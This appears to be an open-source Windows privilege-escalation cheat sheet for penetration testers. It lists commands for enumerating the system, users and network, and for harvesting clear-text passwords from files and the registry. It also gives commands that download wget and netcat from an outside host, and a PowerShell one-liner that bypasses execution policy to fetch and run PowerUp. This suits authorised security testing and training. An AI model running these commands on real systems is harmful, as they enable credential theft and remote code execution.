# About this document
This document is an open source markdown document that can be contributed to via github.
If you see a typo, a bug or a mistake, an improvment, or a vector that we've missed please send me a pull request to the master brunch via the 
[repo link](https://github.com/AddaxSoft/OSWindowsPrivEscalation) and I will review it and approve if approperiate asap.

This document is meant for pen-testers, red teams, and the like.

** Needless to state: You're responosible for what you're doing :-)



# Notes & Format
- commands should be copiable from the boxes; windows inline command comments are noted as `command &:: comment`, so it still should work without messing your easy copy-paste style commands. Think of it as the hash # in Linux.
- if two commands are required to run it's better to combine them into one line using the `&` delimiter
- if a command is an alternative to another; use the `||` delimiter so when command1 fails the second gets executed.



# Contributors
- AK | Author and Maintainer [amAK.xyz](https://imAK.xyz), [@xxByte](https://twitter.com/xxByte)


------

Let's get to it!



# OS Enumurations
In this stage you want to learn as much as possible about the operating system.
Note any odd things and investigate them until you hit a dead-end, then do the next thing.


## Windows Version and Configuration
What Windows is it, what version?

    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

What architecture? x86 or x64?

    wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

Are you on Windows 7 or hight? Skip the reset of the enumurations and use the default `gatherNetworkInfo.vbs` script
This script does all the OS enum magic! Read more about it [here](https://answers.microsoft.com/en-us/windows/forum/windows_7-security/does-anyone-know-what-gathernetworkinfovbs-is-its/63a302a6-cf69-4b9a-a3ef-4b2aff1b2514) run this one liner to generate the config folder that contains all the txt files, which have very juicy info.
To understand better what is being generated, look into the source of the script `c:\windows\system32\gatherNetworkInfo.vbs`

Note: some txt files will contain errors as you're not admin (yet).

    cd %TEMP% & cscript c:\windows\system32\gatherNetworkInfo.vbs & cd config & dir

List all env variables

    set

List all drives

    wmic logicaldisk get caption || fsutil fsinfo drives


## Users Enumuration
Get current username

    echo %USERNAME% || whoami

List all users 

    net user
    whoami /all

List logon requirments; useable for bruteforcing

    net accounts

Get details about a user (i.e. administrator, admin, current user)

    net user administrator
    net user admin
    net user %USERNAME%

List all local groups

    net localgroup 

Get details about a group (i.e. administrators)

    net localgroup administrators


## Network Enumuration
You will want to know how this host is connected; what kind of protocls and services are running, and finally maybe even tap into one of the interfaces and learn what's going on


List all network interfaces

    ipconfig /all

List current routing table

    route print

List the ARP table

    arp -A

List all current connections

    netstat -ano

List firware state and current configuration

    netsh advfirewall firewall dump

List all network shares

    net share



# Looting any clear text passwords
Many admins will store clear-text passwords on the file system. Your target is usually xml, txt, xls files that have the word pass/password on them.


## Searching in files
Quick peek into common password files

note: If you found encrypted contents; decrypt them with gpprefdecrypt.py
encoded passwords are decoded using base64

    TYPE c:\sysprep.inf
    TYPE c:\sysprep\sysprep.xml
    TYPE %WINDIR%\Panther\Unattend\Unattended.xml
    TYPE %WINDIR%\Panther\Unattended.xml

Search for file contents

    cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt

Search for a file with a certain filename

    dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*


## Searching in Registery
Search the registery for key names

    REG QUERY HKLM /F "password" /t REG_SZ /S /K
    REG QUERY HKCU /F "password" /t REG_SZ /S /K
    
Search the registery for any clear text passwords in key values

note: value of each key will be printed out too

    REG QUERY HKLM /F "password" /t REG_SZ /S
    REG QUERY HKCU /F "password" /t REG_SZ /S

Read a vlue of a certain sub key

    REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList


## Processes Enum
What processes are running?

    tasklist /v

Which processes are running as "system"

    tasklist /v /fi "username eq system"

Do you have powershell magic?

    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion


# Tools and Binaries
In this section you will have the basic binaries to make your life a bit easier such as zip, unzip, wget, and the rest.
These tools are meant to be used for local exploits or get other privilege-escalation scripts to do deeper scanning for you.


## (De)compressing files
Download the unzip binary for windows from [here](http://gnuwin32.sourceforge.net/packages/unzip.htm)
Unzip it in your attacker host then serve /bin/unzip.exe via an http server to your target host

    unzip.exe -h &::#usage
    unzip.exe file.zip &::#extract


For compression (or zip) follow the same steps as above, the only difference is the binaries, you can get them [here](http://gnuwin32.sourceforge.net/packages/zip.htm)
zip has also a dependency file called bzip2.dll, which has to be in the same folder and can also be downloaded from the same link ^
Once you have the binary and dependency dll on you can run:

    zip -h &::#for usage
    zip -9 out.zip file.txt file.jpg file.xls &::#encrypt files
    zip -9 out.zip -r c:\some\directory\ &::#encrypt directory
    zip -e -P PASSWORD_HERE -9 out.zip file1.txt file2.xls file3.jpg &::#for encryption with a password 
    zip -e -P PASSWORD_HERE -9 -r c:\some\directory &::#same as above but for directories.


## Uploading / Downloading files 
a wget using powershell

    powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs/wget.exe -UseBasicParsing -OutFile %TEMP%\wget.exe"

wget using bitsadmin (when powershell is not present)

    cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/download/wpecs/wget.exe %TEMP%\wget.exe"

now you have wget.exe that can be executed from %TEMP%wget
for example I will use it here to download netcat

    %TEMP%\wget https://addaxsoft.com/download/wpecs/nc.exe



# Abusing Weak Services
this is the section where "shit gets real"
If you have no powershell skip the first part of this section and go to the manual way
if you do, you're in a bit of luck to automate this using PowerSploit > PrivEsc > PowerUp

## Spot the weak service using PowerSploit's PowerUP
Usage and details of this script can be found [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks



-----

# Special Thanks & Original Inspirations 
- This document wouldn't be here if I didn't get some inspirations:
  - fuzzysecurity's ultimate guide for Windows Privilge escalation, which can be found under this [link](http://www.fuzzysecurity.com/tutorials/16.html).
  - g0tmi1k's Basic Linux Privilege Escalation which can be found under this [link](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
  - Peter Kim's Hackers Playbook 2 - Zero to Hero section [link](http://thehackerplaybook.com/dashboard/)
- Offensive Security, which pushed me really hard beyod my limitations during the many hours of training. 
